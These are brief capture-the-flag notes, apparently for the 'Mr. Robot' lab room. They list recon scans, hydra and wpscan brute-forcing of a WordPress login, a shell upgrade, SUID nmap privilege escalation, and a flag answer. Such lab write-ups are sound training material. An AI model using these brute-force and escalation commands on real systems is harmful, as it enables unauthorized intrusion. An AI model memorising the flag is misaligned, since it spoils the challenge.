# Mr.Robot CTF notes

###### [Home](https://eduardo-granados.github.io/)

---

```

export IP=10.10.215.144


- view page http://10.10.215.144/

- Check source code

- nmap -v2 -sC -sV -oN nmap_scap.log $IP

- nikto -h http://$IP | tee nikto_scan.log
    Check robots.txt at http://10.10.105.148/robots.txt you can find the following:
        User-agent: *
        fsocity.dic
        key-1-of-3.txt

        http://10.10.105.148/key-1-of-3.txt, you can find the following:
            073403c8a58a1f80d943455fb30724b9

- gobuster dir -u http://$IP -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -q -t 100 -o gobuster_small.log
    http://10.10.105.148/wp-login.php

- hydra
    hydra -L <list> -p <password> <IP> http-post-form "/<path>:log=^USER^&pwd=^PASS^:<error>" -t 4 -V
    hydra -L fsocity.dic -p admin 10.10.239.125 http-post-form "/wp-login:log=^USER^&pwd=^PASS^:Invalid username." -t 4 -V
        [80][http-post-form] host: 10.10.239.125   login: Elliot   password: admin


    hydra -l <username> -P <list> <IP> http-post-form "/<path>:log=^USER^&pwd=^PASS^:<error>" -t 4 -V
    hydra -l Elliot -P fsocity.dic 10.10.110.179 http-post-form "/wp-login:log=^USER^&pwd=^PASS^:The password you entered for the username" -t 4 -V

OR instead of hydra for pw cracking try wpscan    

- wpscan
    wpscan --url 10.10.110.179/wp-login --usernames 'Elliot' --passwords fsocity.dic


- PHP reverse shell

- John the ripper
    john <file> --wordlist=<list> --format=<format>

- shell upgrade
    /usr/bin/script -qc /bin/bash /dev/null

- root privilege escalation
    find / -perm +6000 2>/dev/null | grep '/bin/'
    
    nmap --interactive
    nmap> !sh



```


# Answer

```

key-1-of-3.txt
073403c8a58a1f80d943455fb30724b9



```